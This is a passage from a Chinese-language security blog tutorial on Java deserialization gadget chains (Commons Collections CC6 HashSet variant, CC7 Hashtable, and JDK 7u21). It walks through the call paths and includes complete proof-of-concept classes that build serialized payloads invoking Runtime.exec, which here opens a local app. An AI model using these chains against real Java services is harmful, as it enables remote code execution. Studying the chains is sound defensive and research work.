src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516215129678.png" alt="image-20210516215129678"></p><p>然而这里的key还是不可控的，所以我们要找哪里调用了put方法，发现HashSet的readObject很合适：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516215400317.png" alt="image-20210516215400317"></p><p>HashSet的底层其实还是HashMap类，我们需要让HashSet的map属性为HashMap，显然可控。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517111854587.png" alt="image-20210517111854587"></p><h3 id="最终版本PoC-7"><a href="#最终版本PoC-7" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashSet_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open /Applications/IINA.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers_exec);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        TiedMapEntry tmap = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        HashSet hashset = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">        hashset.add(<span class="string">"0range"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将map属性设置为我们的tmap</span></span><br><span class="line">        <span class="comment">//1.先拿到handle</span></span><br><span class="line">        Field map = Class.forName(<span class="string">"java.util.HashSet"</span>).getDeclaredField(<span class="string">"map"</span>);</span><br><span class="line">        map.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap hashset_map = (HashMap) map.get(hashset);</span><br><span class="line">        <span class="comment">//2.拿到map的table属性，里面应该存放entry</span></span><br><span class="line">        Field table = Class.forName(<span class="string">"java.util.HashMap"</span>).getDeclaredField(<span class="string">"table"</span>);</span><br><span class="line">        table.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] array = (Object[])table.get(hashset_map);</span><br><span class="line">        <span class="comment">//3.将第一个entry的key设置为我们的tmap</span></span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line">        Field key = node.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        key.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        key.set(node,tmap);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_HashSet.ser"</span>)));</span><br><span class="line">        fout.writeObject(hashset);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_HashSet.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然中间用到了LazyMap，那么又可以复用，InstantiateTransformer和TemplatesImpl，PoC就不粘在这里了，可以去看我的<a href="https://github.com/0range228" target="_blank" rel="noopener">github</a>。</p><h2 id="cc7"><a href="#cc7" class="headerlink" title="cc7"></a>cc7</h2><p>条件：</p><ul><li><p><strong>commons-collections:3.1-3.2.1</strong></p></li><li><p><strong>jdk1.7&amp;1.8</strong></p></li></ul><h3 id="利用链寻找-6"><a href="#利用链寻找-6" class="headerlink" title="利用链寻找"></a>利用链寻找</h3><p>cc7的想法依然是寻找LazyMap.get()的触发点。</p><p>cc7的后半段和cc1的lazymap版本一样，触发点选择到了AbstractMap的equals方法来触发对LazyMap的get方法的调用：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517121849144.png" alt="image-20210517121849144"></p><p>这里如果m是可控的，那么可以设置m为LazyMap，这样就可以触发调用链的后半部分。</p><p>这里要寻找哪里调用了equals方法，ysoserial找到了HashTable的reconstitutionPut方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517122453468.png" alt="image-20210517122453468"></p><p>这里面e是参数tab的索引，如果e.key是AbstractMap，那么就可以调用AbstractMap.equals方法。</p><p>现在问题来到了，如何才能触发reconstitutionPut方法呢？</p><p>我们发现在HashTable的readObject方法里面就调用了reconstitutionPut方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517122844443.png" alt="image-20210517122844443"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">     <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    <span class="keyword">int</span> origlength = s.readInt();</span><br><span class="line">    <span class="keyword">int</span> elements = s.readInt();<span class="comment">//elements hashtable中的元素个数</span></span><br><span class="line">    ....</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;<span class="comment">//通过elements的长度读取键值对</span></span><br><span class="line">        K key = (K)s.readObject();</span><br><span class="line">        V value = (V)s.readObject();</span><br><span class="line">        reconstitutionPut(table, key, value);<span class="comment">//该函数会对元素进行比较</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.table = newTable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看reconstitutionPut方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reconstitutionPut</span><span class="params">(Entry&lt;K,V&gt;[] tab, K key, V value)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> StreamCorruptedException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> hash = hash(key);<span class="comment">//计算key的hash</span></span><br><span class="line">    <span class="keyword">int</span> index = (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;<span class="comment">//通过hash确定索引</span></span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = tab[index] ; e != <span class="keyword">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果没有相同元素，创建元素到hashtable中</span></span><br><span class="line">    Entry&lt;K,V&gt; e = tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> Entry&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在我们跟着reconstitutionPut走，reconstitutionPut方法有三个参数：</p><p>table，key，value(后面这两个是流操作，看过writeObject就知道是hashtable自己的key和value属性)</p><p>跟进去reconstitutionPut：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517133736874.png" alt="image-20210517133736874"></p><p>我们当然希望走的是AbstractMap类的equals方法，并且保证参数key是LazyMap类型，这样就可以走上LazyMap.get这条熟悉的道路了。</p><p><strong>AbstractMap类是一个抽象类，他实现了Map接口中的equals方法。</strong></p><p><strong>HashMap是AbsrtactMap的实现类，他没有重写equals方法，所以如果是HashMap#equals方法，其实走的是AbstractMap的equals方法。</strong></p><p>也就是说，如果<code>e.key</code>是HashMap，<code>参数(key)</code>是LazyMap，是可以走得通的。</p><p>但是怎么才能走到这个判断呢，需要先保证前半部分<code>e.hash == hash</code>，其实在String.equals()方法中存在hash碰撞。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String a = <span class="string">"yy"</span>;</span><br><span class="line">String b = <span class="string">"zZ"</span>;</span><br><span class="line">a.hashcode() == b.hashcode();<span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>大家不要忘了，要想走到这里，最外层还有一个<code>e!=null</code>条件。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517143801027.png" alt="image-20210517143801027"></p><p>tab就是table属性，table是Hashtable用来存放entry的数组，初始状态就算有长度也是null占位。</p><p>所以我们要像进入if，需要<code>e!=null</code>成立。</p><p>需要先有一个lazymap进来，将table属性赋值、还有将hash值改成自己的参数，等后续第二个进来的lazymap再触发。</p><p>第二个进来的lazymap，才会符合e不为空，将自己的hash和e.hash比较。（用yy和zZ绕过）</p><p>进入e.key.equals(key)，e.key就是第一次进来的lazymap，参数key就是第二次进来的lazymap的innermap。</p><p>还有个细节，在第二次进入后，会进入lazymap2.equals(innermap2)</p><p>equals方法属于HashMap的父类AbstractMap，对于这部分来说，</p><p>LazyMap继承了AbstractMapDecorator的map属性，是Map接口，所以当构造函数的参数是HashMap类型，自然就是LazyMap的map属性自然就是HashMap类型了。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517144833958.png" alt="image-20210517144833958"></p><p>但是HashMap并没有equals方法，实际上走的是父类AbstractMap#equals方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517150342575.png" alt="image-20210517150342575"></p><h3 id="最终版本PoC-8"><a href="#最终版本PoC-8" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashTable_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> Transformer[]&#123;&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open /Applications/IINA.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//先用一个假的chain占位置，稍后反射改回来</span></span><br><span class="line">        <span class="comment">//这里还是为了能够避开lazymap.put提前RCE</span></span><br><span class="line">        Transformer fakeChain = <span class="keyword">new</span> ChainedTransformer(fakeTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//LazyMap实例</span></span><br><span class="line">        Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建两个lazymap实例</span></span><br><span class="line">        Map lazyMap1 = LazyMap.decorate(innerMap1,fakeChain);</span><br><span class="line">        lazyMap1.put(<span class="string">"yy"</span>, <span class="number">1</span>);</span><br><span class="line">        Map lazyMap2 = LazyMap.decorate(innerMap2,fakeChain);</span><br><span class="line">        lazyMap2.put(<span class="string">"zZ"</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Hashtable hashTable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        hashTable.put(lazyMap1, <span class="string">"0range"</span>);</span><br><span class="line">        hashTable.put(lazyMap2, <span class="string">"0range"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射设置真的 chain 数组</span></span><br><span class="line">        Field field = ChainedTransformer.class.getDeclaredField("iTransformers");</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(fakeChain, transformers_exec);</span><br><span class="line"></span><br><span class="line">        lazyMap2.remove(<span class="string">"yy"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_TemplatesImpl_HashTable.ser"</span>)));</span><br><span class="line">        fout.writeObject(hashTable);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_TemplatesImpl_HashTable.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为什么需要remove掉第二次的lazymap？</p><p>因为Hashtable的put方法里面也调用了equals方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517152132073.png" alt="image-20210517152132073"></p><p>会导致LazyMap2中右增加了(“yy“，”yy“)这个键值对，会影响当前lazymap2的size不再是1，而是2</p><p>导致在第二次进入的时候倒在了size的判断上。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517152618059.png" alt="image-20210517152618059"></p><p>当然既然还是扯到LazyMap，当然可以复用之前的InstantiateTransformer，</p><p>具体可以看我的<a href="https://github.com/0range228" target="_blank" rel="noopener">github</a>。</p><h2 id="CC链总结"><a href="#CC链总结" class="headerlink" title="CC链总结"></a>CC链总结</h2><p>五大反序列化利用基类：</p><blockquote><p>1.AnnotationInvocationHandler：反序列化的时候会循环调用成员变量的get方法，用来和lazyMap配合使用。</p><p>2.PriorityQueue：反序列化的时候会调用TransformingComparator中的transformer的transform方法，用来直接和Transformer配合使用。</p><p>3.BadAttributeValueExpException：反序列化的时候会去调用成员变量val的toString函数，用来和TiedMapEntry配合使用。（TiedMapEntry的toString函数会再去调自身的getValue）。</p><p>4.HashSet：反序列化的时候会去循环调用自身map中的put方法，用来和HashMap配合使用。</p><p>5.Hashtable：当里面包含2个及以上的map的时候，回去循环调用map的get方法，用来和LazyMap配合使用。</p></blockquote><p>四大Transformer的transform：</p><blockquote><p>1.ChainedTransformer：循环调用成员变量iTransformers数组中的tranform方法。    </p><p>2.InvokerTransformer： 通过反射的方法调用传入transform方法中的input对象的方法（方法通过成员变量iMethodName设置，参数通过成员变量iParamTypes设置）    </p><p>3.ConstantTransformer：返回成员变量iConstant的值。    </p><p>4.InstantiateTransformer：通过反射的方法返回传入参数input的实例。（构造函数的参数通过成员变量iArgs传入，参数类型通过成员变量iParamTypes传入）    </p></blockquote><p>三大Map：</p><blockquote><p>1.LazyMap：通过调用LazyMap的get方法可以触发它的成员变量factory的tranform方法，用来和上一节中的Tranformer配合使用。</p><p>2.TiedMapEntry：通过调用TiedMapEntry的getValue方法实现对他的成员变量map的get方法的调用，用来和LazyMap配合使用。</p><p>3.HashMap：通过调用HashMap的put方法实现对成员变量hashCode方法的调用，用来和TiedMapEntry配合使用（TiedMapEntry的hashCode函数会再去调自身的getValue）。</p></blockquote><h1 id="7u21"><a href="#7u21" class="headerlink" title="7u21"></a>7u21</h1><p>条件：</p><ul><li>jdk&lt;=7u21</li></ul><p>这是一条十分有个性的链，因为它仅依赖jre，不依赖任何第三方库。</p><p>先说个小tip：神奇的<code>f5a5a608</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="string">"f5a5a608"</span>.hashCode()); == <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="利用链构造-1"><a href="#利用链构造-1" class="headerlink" title="利用链构造"></a>利用链构造</h2><p>用到了AnnotationInvocationHandler作为动态代理来触发cc2里面的TemplatesImpl携带恶意_bytecode，执行静态代码块加载。</p><p>前情回顾：</p><ul><li>TemplatesImpl 类可被序列化，并且其内部名为 _bytecodes 的成员可以用来存储某个 class 的字节数据</li><li>通过 TemplatesImpl 类的 getOutputProperties 方法 / newTransformer方法 ，可以最终导致 _bytecodes 所存储的字节数据被转换成为一个 Class（通过 ClassLoader.defineClass），并实例化此 Class，导致 Class 的构造方法/静态代码块中的代码被执行。</li></ul><p>光有链还是不够的，需要找个readObject的承接点，让这条链和反序列化入口点连接起来</p><p>7u21选择的入口点是LinkedHashSet的readObject方法，实际上是父类HashSet的readObject方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521093720662.png" alt="image-20210521093720662"></p><p>这里面的e就是反序列化后的对象。</p><p>为什么选择HashMap呢？是因为它有个神奇的equals方法</p><p>开启支线任务：</p><p>这里先进入AnnotationInvocationHandler的invoke方法看看：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521102440957.png" alt="image-20210521102440957"></p><p>这里如果调用的方法名称是equals，并且参数个数和类型匹配，就会进入equalsImpl方法</p><p>看一看equalsImpl方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521103501367.png" alt="image-20210521103501367"></p><p>到这里，梳理一下：</p><p>我们就在jdk里面找到了一个原生类AnnotationInvocationHandler，他可以充当动态代理，他的invoke方法会调用了本身的equalsImpl方法，在equalsImpl内部又会调用自身memberValues属性的get方法。</p><p>之前我们是将this.mamberValues赋值为LazyMap，但是现在我们需要找到一个jdk原生类。</p><p>发现下面还有一个invoke方法</p><p>ysoserial的思路肯定也是盯着哪些类有equals方法，我们的动态代理只要在之后去invoke这个equals方法就可以了。</p><p>世界线收束：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521110552890.png" alt="image-20210521110552890"></p><p>在我们之前发现的HashMap的put方法中，就会调用key的equals方法。</p><p>能到这里需要的条件：</p><ul><li>e.hash == hash</li><li>e.key == key</li></ul><p>首先会调用内部 <code>hash()</code> 函数计算 key 的 hash 值，然后遍历所有元素，*<em>当要插入的元素的 hash 和已有 entry 相同，且 key 和 Entry的 key 指向同一个对象 或 二者equals时 *</em>，则认为 key 是否已经存在，返回 oldValue，否则调用 <code>addEntry()</code> 添加元素。</p><p>这里核心关键点就是让key指向的是我们通过动态代理生成的Proxy对象，我们知道调用Proxy对象的任何方法，本质上都是在调用InvokcationHandler对象中被重写的invoke方法。因为生成Proxy对象时传入的参数是InvokcationHandler的子类AnnotationInvocationHandler，所以自然要调用AnnotationInvocationHandler.invoke()方法。</p><p>这里有几个细节：</p><ol><li>首先需要保证我们传入携带动态代理的key之前，map里面就已经有一个entry了，才能保证e不为null，进入循环</li><li>第一个entry应该为Templates对象</li><li>为了保证有有序添加，所以我们才用LinkedHashSet</li></ol><p>这里先看一下限制条件：</p><ol><li><p>e.hash == hash</p><p>这个需要保证的是两个hash值相等，hash值就是<code>hash()</code>值相等</p><p>想到我们之前的提到的神奇的<code>f5a5a608</code>，它的hashcode()==0</p></li></ol><p>看一下hash()源码：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521111553605.png" alt="image-20210521111553605"></p><p>这里其实结果只受k.hashcode()的影响。</p><ul><li>对于普通的obj来说，这里k就是本身</li><li>对于一个代理类来说，统一调用invoke方法。如果当前的k是AnnotationInvocationHandler类，那么调用的就是AnnotationInvocationHandler类内部的hashCodeImpl()方法</li></ul><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521112200882.png" alt="image-20210521112200882"></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521112527126.png" alt="image-20210521112527126"></p><p>跟进memberValueHashCode方法再看看：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521112817611.png" alt="image-20210521112817611"></p><p>改写一下就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">( <span class="number">127</span> * key.hashCode() ) ^ value.hashCode()</span><br></pre></td></tr></table></figure><p>两个hash：</p><ul><li>TemplatesImpl实例.hashCode()</li><li>( 127 * key.hashCode() ) ^ TemplatesImpl实例.hashCode()</li></ul><p>我们希望key就是<code>f5a5a608</code>，这样的话返回值就是TemplatesImpl实例.hashCode()了，就可以绕过<code>e.hash == hash</code>的check了。</p><p>细节：</p><ul><li>可以看到hashCodeImpl()内部是有一个循环的，为了让最后的结果和value.hashCode()相同，我们希望memberValues只有一个entry，再put一个相同的key就行了，为了让tmpl和第一次的一样。</li><li>我们这里只需要让memberValue这个属性里面存放一个HashMap就行了，这个map的key是<code>f5a5a608</code>，value是包含恶意字节码的TemplatesImpl对象就行了</li></ul><h2 id="最终PoC"><a href="#最终PoC" class="headerlink" title="最终PoC"></a>最终PoC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span 